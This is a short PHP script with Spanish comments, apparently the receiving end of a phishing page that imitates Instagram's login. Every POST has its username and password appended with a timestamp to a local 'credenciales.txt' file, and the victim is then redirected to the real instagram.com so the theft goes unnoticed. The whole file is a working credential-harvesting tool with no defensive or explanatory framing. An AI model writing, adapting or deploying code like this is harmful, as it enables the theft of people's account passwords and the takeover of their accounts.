<?php
// Ruta absoluta a tu carpeta de destino
$directorio = "C:/xampp/htdocs/insta/capturas/";
$archivo = $directorio . "credenciales.txt";

// Crear la carpeta si no existe
if (!file_exists($directorio)) {
    mkdir($directorio, 0777, true);
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'] ?? 'No definido';
    $password = $_POST['password'] ?? 'No definida';
    $fecha = date("d/m/Y H:i:s");

    // Formato de entrada
    $datos = "--- NUEVO INTENTO [$fecha] ---\n";
    $datos .= "Usuario: $username\n";
    $datos .= "Contraseña: $password\n\n";

    // Guardar en el archivo (se añade al final con FILE_APPEND)
    file_put_contents($archivo, $datos, FILE_APPEND);

    // Redirección final
    header("Location: https://www.instagram.com");
    exit();
} else {
    // Si acceden directamente al archivo, los manda al inicio
    header("Location: index.html");
    exit();
}
?>